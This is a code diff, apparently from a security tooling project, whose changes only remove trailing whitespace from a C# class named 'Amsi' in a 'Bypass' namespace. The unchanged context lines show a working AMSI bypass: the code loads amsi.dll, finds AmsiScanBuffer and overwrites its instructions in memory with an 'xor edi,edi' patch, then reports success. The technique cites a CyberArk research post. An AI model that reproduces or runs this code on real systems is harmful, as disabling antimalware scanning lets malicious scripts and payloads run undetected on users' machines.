@@ -5,7 +5,7 @@ namespace Bypass
 {
     public class Amsi
     {
-        //implement required kernel32.dll functions 
+        //implement required kernel32.dll functions
         [DllImport("kernel32")]
         public static extern IntPtr LoadLibrary(string name);
         [DllImport("kernel32")]
@@ -17,7 +17,7 @@ namespace Bypass
 
         public static int Patch()
         {
-            //Get pointer for the amsi.dll        
+            //Get pointer for the amsi.dll
             IntPtr TargetDLL = LoadLibrary("amsi.dll");
             if (TargetDLL == IntPtr.Zero)
             {
@@ -34,7 +34,7 @@ namespace Bypass
             }
 
             /*
-             *  Apply memory patching as described by Cyberark here:          
+             *  Apply memory patching as described by Cyberark here:
              *  https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
              */
             UIntPtr dwSize = (UIntPtr)4;
@@ -54,7 +54,7 @@ namespace Bypass
             Marshal.Copy(Patch, 0, unmanagedPointer, 3);
 
             //Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
-            MoveMemory(AmsiScanBufrPtr + 0x001b, unmanagedPointer, 3); 
+            MoveMemory(AmsiScanBufrPtr + 0x001b, unmanagedPointer, 3);
 
             Console.WriteLine("Great success. AmsiScanBuffer patched! :)");
             return 0;
